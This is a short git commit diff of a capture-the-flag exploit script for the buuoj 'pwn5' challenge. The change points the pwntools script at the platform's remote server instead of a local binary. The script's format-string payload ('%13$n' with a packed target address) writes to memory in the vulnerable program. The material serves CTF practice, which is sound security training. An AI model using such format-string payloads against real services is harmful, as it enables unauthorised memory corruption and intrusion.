cd4783c950cf9366d2aefe914eaefa80424132bf
zeredy879 <903796007@qq.com>
2022-11-01 12:23:08 +0800

    updata

--- buuoj/pwn5/sol.py
+++ buuoj/pwn5/sol.py
@@ -2,7 +2,8 @@ from pwn import *
 
 context.log_level = "debug"
 
-r = process("./pwn")
+# r = process("./pwn")
+r = remote("node4.buuoj.cn", 25060)
 r.recvuntil(b":")
 r.send(b"1111111%13$n" + p32(0x804C044))
 r.recvuntil(b":")
